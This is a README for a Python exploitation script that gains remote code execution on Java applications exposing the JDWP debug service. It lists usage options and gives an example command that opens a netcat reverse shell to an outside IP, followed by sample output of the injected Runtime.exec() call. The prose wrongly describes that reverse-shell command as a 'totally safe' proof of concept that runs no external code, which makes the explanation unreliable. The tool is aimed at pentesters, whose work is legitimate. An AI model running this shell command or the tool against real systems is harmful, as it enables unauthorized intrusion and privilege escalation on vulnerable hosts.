# JDWP exploitation script

## What is it ?
This exploitation script is meant to be used by pentesters against active JDWP service, in order to gain Remote Code Execution.

## How does it work ?
Well, in a pretty standard way, the script only requires a Python3 interpreter:
```shell
usage: jdwp-shellifier.py [-h] [-t IP] [-p PORT] [--break-on JAVA_METHOD] [-c COMMAND]

Universal exploitation script for JDWP

options:
  -h, --help            show this help message and exit
  -t IP, --target IP    Remote target IP (default: 0.0.0.0)
  -p PORT, --port PORT  Remote target port (default: 8000)
  --break-on JAVA_METHOD
                        Specify full path to method to break on (default: java.net.ServerSocket.accept)
  -c COMMAND, --cmd COMMAND
                        Specify command to execute remotely (default: None)
```

By default, it targeted the `0.0.0.0` IP and `8000` port.
	
This command will only inject Java code on the JVM and show some info like Operating System, Java version. Since it does not execute external code/binary, it is totally safe and can be used as Proof-Of-Concept.
```shell
python3 jdwp-shellifier.py -c "/bin/busybox nc 192.168.45.178 443 -e /bin/bash"
``` 

This command will actually execute the process with the specified argument **with the rights given to the running JVM**. Thus, if it was ran by `root`, you'll basically get a low-hanging fruit Privilege Escalation.

Output will looks like:
```shell
[+] Target: 0.0.0.0:8000
[*] Trying to connect...
[+] Connection successful!
[+] Handshake sent
[+] Handshake successful
[*] Requesting ID sizes from the JDWP server...
        • fieldIDSize: 8
        • methodIDSize: 8
        • objectIDSize: 8
        • referenceTypeIDSize: 8
        • frameIDSize: 8
[+] ID sizes have been successfully received and set.
[*] Requesting version information from the JDWP server...
        • description: Java Debug Wire Protocol (Reference Implementation) version 11.0
JVM Debug Interface version 11.0
JVM version 11.0.16 (OpenJDK 64-Bit Server VM, mixed mode, sharing)
        • jdwpMajor: 11
        • jdwpMinor: 0
        • vmVersion: 11.0.16
        • vmName: OpenJDK 64-Bit Server VM
[+] Version information has been successfully received and set.
[+] Found Runtime class: id=0x8b1
[+] Found Runtime.getRuntime(): id=0x7f2ae8023998
[+] Created break event id=0x2
[+] Resume VM signal sent
[+] Waiting for an event on 'accept'
[*] Go triggering the corresponding ServerSocket (e.g., 'nc ip 5000 -z')
[+] Received matching event from thread 0x94d
[+] Payload to send: '/bin/busybox nc 192.168.45.178 443 -e /bin/bash'
[+] Command string object created id:94e
[+] Runtime.getRuntime() returned context id:0x94f
[+] Found Runtime.exec(): id=7f2ae80239d0
[+] Runtime.exec() successful, retId=950
[+] Resume VM signal sent
```

Before sending questions, make sure to read http://blog.ioactive.com/2014/04/hacking-java-debug-wire-protocol-or-how.html for full understanding of the JDWP protocol. 

## Thanks
* Ilja Van Sprundel
* Sebastien Macke





